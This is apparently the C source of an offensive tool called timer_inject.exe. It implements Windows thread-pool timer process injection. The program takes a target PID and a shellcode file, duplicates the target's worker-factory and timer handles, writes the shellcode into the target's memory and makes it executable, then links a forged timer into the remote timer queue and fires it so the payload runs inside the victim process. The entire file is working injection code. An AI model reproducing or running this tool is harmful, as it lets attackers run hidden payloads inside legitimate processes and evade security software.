// c:\users\Administrator\Desktop\Tools\mingw64\bin\x86_64-w64-mingw32-gcc.exe main.c -o timer_inject.exe

#include <stdio.h>
#include "poolinject.h"

// https://ntdoc.m417z.com 
extern NTSTATUS NtSetTimer2(
    _In_ HANDLE TimerHandle,
    _In_ PLARGE_INTEGER DueTime,
    _In_opt_ PLARGE_INTEGER Period,
    _In_ PT2_SET_PARAMETERS Parameters
);

extern NTSTATUS NtQueryInformationWorkerFactory(
    _In_  HANDLE WorkerFactoryHandle,
    _In_  DWORD WorkerFactoryInformationClass,
    _Out_ PVOID WorkerFactoryInformation,
    _In_  ULONG WorkerFactoryInformationLength,
    _Out_opt_ PULONG ReturnLength
);

/*
Obtain a handle of a specified type in a process

@ Params
    PID             - An integer representing the Process ID of the process in which we are obtaining a specific handle from
    HandleName      - A wide string representing the handle type
    Access          - Specifies the access rights for the handle being retrieved through DuplicateHandle (e.g. PROCESS_ALL_ACCESS)
 
@ Return 
    The desired handle.
*/
HANDLE GetHandle( DWORD PID, LPWSTR HandleName, SIZE_T Access )
{
    HANDLE hProcess         = NULL;
    NTSTATUS Status         = { 0 };
    DWORD szInformation     = 0;
    HANDLE hDupObject       = NULL;

    PPUBLIC_OBJECT_TYPE_INFORMATION      ObjectInformation = NULL;
    PPROCESS_HANDLE_SNAPSHOT_INFORMATION ProcessHandleInfo = NULL;

    WIN32_FUNC( NtQueryInformationProcess );
    WIN32_FUNC( NtQueryObject );

    NtQueryInformationProcess = GetProcAddress( GetModuleHandleA( "ntdll.dll" ), "NtQueryInformationProcess" );
    NtQueryObject             = GetProcAddress( GetModuleHandleA( "ntdll.dll" ), "NtQueryObject" );

    // Principle of least privilege... for our handles.
    //printf( "%S\n", HandleName );
    if ( !wcscmp( HandleName, L"Process" ) ) 
        hProcess = OpenProcess( PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, PID );
    else
        hProcess = OpenProcess( PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, PID );

    if ( hProcess == INVALID_HANDLE_VALUE || !hProcess ) {
        printf( "OpenProcess error: 0x%llx\n", GetLastError() );
        return NULL;
    }
    
    if ( hProcess && !wcscmp( HandleName, L"Process" ) )
        return hProcess;

    do {
        ProcessHandleInfo = realloc( ProcessHandleInfo, szInformation );
        Status = NtQueryInformationProcess( hProcess, ProcessHandleInformation, ProcessHandleInfo, szInformation, &szInformation );
        if ( Status && Status != STATUS_INFO_LENGTH_MISMATCH ) {
            printf( "Error querying target process's handle table: 0x%llx\n", Status );
            goto Exit;
        }
    } while ( Status == STATUS_INFO_LENGTH_MISMATCH );

    for ( DWORD i = 0; i < ProcessHandleInfo->NumberOfHandles; i++ ) {
        
        Status = DuplicateHandle( hProcess, ProcessHandleInfo->Handles[i].HandleValue, (HANDLE)-1, &hDupObject, Access, 0, 0 );

        if ( !Status )
            continue;

        szInformation = 0;

        do {
            ObjectInformation = realloc( ObjectInformation, szInformation );
            Status = NtQueryObject( hDupObject, ObjectTypeInformation, ObjectInformation, szInformation, &szInformation );
        } while ( Status == STATUS_INFO_LENGTH_MISMATCH );

        if ( !wcscmp( ObjectInformation->TypeName.Buffer, HandleName ) ) {
            CloseHandle( hProcess );
            return hDupObject;
        }

        CloseHandle( hDupObject );

    }

    Exit:
    {
        if ( hProcess && hProcess != (HANDLE)-1 )
            CloseHandle( hProcess );
        if ( hDupObject )
            CloseHandle( hDupObject );
    }
    return NULL;

}

/*
Read the bytes of a file

@ Params
    FilePath  - A string containing the file path of the file to read
    SzFile    - A pointer that will be populated with the amount of bytes read

@ Return 
    A pointer to the buffer of the bytes read
*/
PVOID ReadFileBytes( PCHAR FilePath, SIZE_T* SzFile ) {

    FILE* file          = NULL;
    size_t bytesRead    = 0;
    PVOID buffer        = NULL;
    DWORD length        = 0;
    
    file = fopen( FilePath, "rb" );

    if ( !file ) {
        return NULL;
    }

    fseek( file, 0, SEEK_END );
    length = ftell( file );
    fseek( file, 0, SEEK_SET ); 

    buffer = malloc( length );

    if ( !buffer ) {
        return NULL;
    }

    bytesRead = fread( buffer, 1, length, file );

    if ( bytesRead != length ) {
        free( buffer );
        fclose( file );
        return NULL;
    }

    fclose(file);

    if ( SzFile ) {
        *SzFile = length;
    }
    return buffer;
}
void main( int argc, char* argv[] )
{
    DWORD PID      = 0;
    PVOID Shc      = NULL;
    DWORD SzShc    = 0;

    HANDLE hProcess = NULL;
    HANDLE hFactory = NULL;
    HANDLE hTimerQ  = NULL;

    BOOL        Status      = 0;
    PVOID       BaseAddress = NULL;
    SIZE_T      RegionSize  = 0;
    DWORD       OldProtect  = 0;

    WORKER_FACTORY_BASIC_INFORMATION FactoryInfo  = { 0 };
    PFULL_TP_TIMER                   TpTimer      = NULL;
    PFULL_TP_TIMER                   TimerAddress = NULL;
    PVOID                            StartLink    = NULL;
    PVOID                            EndLink      = NULL;
    DWORD                            SzTimer      = sizeof( FULL_TP_TIMER );
    LARGE_INTEGER                    li           = { 0 };
    T2_SET_PARAMETERS                TimerParams  = { 0 };

    WIN32_FUNC( NtSetTimer2 );
    WIN32_FUNC( NtQueryInformationWorkerFactory );

    NtSetTimer2                     = GetProcAddress( GetModuleHandleA( "ntdll.dll" ), "NtSetTimer2" );
    NtQueryInformationWorkerFactory = GetProcAddress( GetModuleHandleA( "ntdll.dll" ), "NtQueryInformationWorkerFactory" );

    if ( argc != 3 ) {
        printf( "Usage: [exe] [pid to inject] [/path/to/shellcode]\n" );
        return;
    }
    PID   = strtol( argv[1], NULL, 10 );
    Shc   = ReadFileBytes( argv[2], &SzShc );

    if ( PID == 0 ) {
        PID = GetCurrentPID();
    }

    printf( "PID is %d\n", PID );
    printf( "The length of shellcode is: %d\n", SzShc );

    // Get Handles
    hProcess    = GetHandle( PID, L"Process", PROCESS_ALL_ACCESS );
    if ( !hProcess ) {
        printf( "Could not obtain a handle to the target process\n" );
        goto Exit;
    }

    hFactory    = GetHandle( PID, L"TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS );
    if ( !hFactory ) {
        printf( "Could not obtain a handle to the target process's ThreadFactory\n" );
        goto Exit;
    }
    printf( "Grabbed target's TpWorkerFactory\n" );

    hTimerQ     = GetHandle( PID, L"IRTimer", TIMER_ALL_ACCESS );
    if ( !hTimerQ ) {
        printf( "Could not obtain a handle to the target process's IRTimer\n" );
        goto Exit;
    }
    printf( "Grabbed target's IRTimer\n" );

    // Allocate space for the payload
    RegionSize  = SzShc;
    BaseAddress = VirtualAllocEx( hProcess, NULL, RegionSize, MEM_COMMIT, PAGE_READWRITE );
    if ( Status ) {
        printf( "Error allocating memory for payload to target process: 0x%llx\n", GetLastError() );
        goto Exit;
    }
    printf( "Allocated 0x%llx bytes to: 0x%llx\n", RegionSize, BaseAddress );

    // Write the payload
    Status     = WriteProcessMemory( hProcess, BaseAddress, Shc, SzShc, NULL );
    if ( !Status ) {
        printf( "Error writing payload to target process: 0x%llx\n", GetLastError() );
        goto Exit;
    }
    printf( "Wrote payload in successfully!\n" );

    // Get WorkerFactoryBasicInformation so we can obtain the StartParameter
    Status     = NtQueryInformationWorkerFactory( hFactory, WorkerFactoryBasicInformation, &FactoryInfo, sizeof(FactoryInfo), NULL );
    if ( Status ) {
        printf( "Error querying Worker Factory information: 0x%llx\n", Status );
        goto Exit;
    }
    printf( "Queried Worker Factory information successfully!\n" );

    // Make payload executable
    Status      = VirtualProtectEx( hProcess, BaseAddress, RegionSize, PAGE_EXECUTE_READ, &OldProtect );
    if ( !Status ) {
        printf( "Error making reprotecting payload to executable in target process: 0x%llx\n", GetLastError() );
        goto Exit;
    }

    // Create a timer in our local process
    TpTimer     = CreateThreadpoolTimer( BaseAddress, NULL, NULL );
    if ( !TpTimer ) {
        printf( "Error creating a threadpool timer: 0x%llx\n", GetLastError() );
        goto Exit;
    }

    // Allocate space for the timer
    RegionSize     = SzTimer;
    TimerAddress   = VirtualAllocEx( hProcess, TimerAddress, RegionSize, MEM_COMMIT, PAGE_READWRITE );
    if ( !RegionSize ) {
        printf( "Error allocating memory for timer to target process: 0x%llx\n", GetLastError() );
        goto Exit;
    }
    printf( "Allocated 0x%llx bytes to: 0x%llx\n", RegionSize, TimerAddress );

    // Rebase the pointers of the timer to be based on the remote allocation we made
    TpTimer->Work.CleanupGroupMember.Pool    = FactoryInfo.StartParameter; // Remote process's pool
    TpTimer->DueTime                         =  -10000000;
    TpTimer->WindowStartLinks.Key            =  -10000000;
    TpTimer->WindowEndLinks.Key              =  -10000000;
    TpTimer->WindowStartLinks.Children.Flink = &TimerAddress->WindowStartLinks.Children;
    TpTimer->WindowStartLinks.Children.Blink = &TimerAddress->WindowStartLinks.Children;
    TpTimer->WindowEndLinks.Children.Flink   = &TimerAddress->WindowEndLinks.Children;
    TpTimer->WindowEndLinks.Children.Blink   = &TimerAddress->WindowEndLinks.Children;

    StartLink  = &TimerAddress->WindowStartLinks;
    EndLink    = &TimerAddress->WindowEndLinks;

    // Write the timer in
    Status     = WriteProcessMemory( hProcess, TimerAddress, TpTimer, SzTimer, NULL );
    if ( !Status ) {
        printf( "Error writing timer to target process: 0x%llx\n", GetLastError() );
        goto Exit;
    }
    printf( "Wrote timer in successfully!\n" );

    // Insert our timer's start and end links into the remote process's timer queue
    Status     = WriteProcessMemory( hProcess, &TpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root, &StartLink, sizeof( PVOID ), NULL );
    if ( !Status ) {
        printf( "Error overwriting WindowStart.Root in target process: 0x%llx\n", GetLastError() );
        goto Exit;
    }

    // Insert our timer's start and end links into the remote process's timer queue
    Status     = WriteProcessMemory( hProcess, &TpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowEnd.Root, &EndLink, sizeof( PVOID ), NULL );
    if ( !Status ) {
        printf( "Error overwriting WindowEnd.Root in target process: 0x%llx\n", GetLastError() );
        goto Exit;
    }

    li.QuadPart = -10000000;

    // Signal the remote process's timer queue to execute our payload
    Status      = NtSetTimer2( hTimerQ, &li, NULL, &TimerParams );
    if ( Status ) {
        printf( "Error signalling timer in target process: 0x%llx\n", Status );
        goto Exit;
    }
    printf( "Payload executed\n" );

    Exit:
    {
        // Clean up
        RtlSecureZeroMemory( Shc, SzShc );

        if ( hFactory ) {
            CloseHandle( hFactory );
        }
        if ( hTimerQ ) {
            CloseHandle( hTimerQ );
        }
        if ( hProcess ) {
            CloseHandle( hProcess );
        }
    }
    
}
